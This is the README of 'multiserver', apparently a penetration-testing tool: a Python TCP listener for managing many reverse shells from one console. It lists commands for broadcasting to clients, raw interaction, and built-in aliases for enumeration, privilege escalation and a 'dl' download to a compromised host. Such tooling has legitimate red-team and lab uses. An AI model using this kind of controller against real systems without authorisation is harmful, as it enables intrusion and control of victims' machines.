# multiserver

Multi-client TCP listener with an interactive console. Manage many reverse shells or netcat connections from one terminal.

## Setup

```bash
pip install prompt_toolkit
python multiserver.py [port]   # default: 4444
```

Logs written to `./logs/client_<id>_<ip>_<port>.log`.

## Console Commands

| Command | Action |
|---|---|
| `list` / `ls` | Show connected clients |
| `<id> <message>` | Send message to client |
| `all <message>` | Broadcast to all clients |
| `kick <id>` | Disconnect client |
| `interact <id>` / `i <id>` | Raw passthrough mode (`~.` or Ctrl-C to exit) |
| `os <id> <windows\|linux>` | Flag client OS |
| `alias` | List aliases |
| `alias add <name> <win-cmd> ::: <lin-cmd>` | Define alias |
| `alias del <name>` | Remove alias |
| `run <id> <name> [arg0...]` | Run alias on client (OS-appropriate) |
| `exit` / `quit` | Shut down server |

Ctrl-C and Ctrl-D do **not** exit the server — only `exit`/`quit` does.

## Built-in Aliases

`whoami`, `sysinfo`, `net`, `ps`, `ports`, `users`, `admins`, `privesc`, `tasks`, `dl`

Each alias has separate Windows and Linux commands. Set client OS first with `os <id> windows|linux`, then `run <id> <alias>`.

```
> os 1 linux
> run 1 whoami
> run 1 dl http://example.com/file /tmp/file
```

## Features

- Tab completion for commands
- Command history (arrow keys)
- Per-client log files
- Interactive passthrough mode (raw bytes, no buffering)
- Graceful shutdown flushes all logs
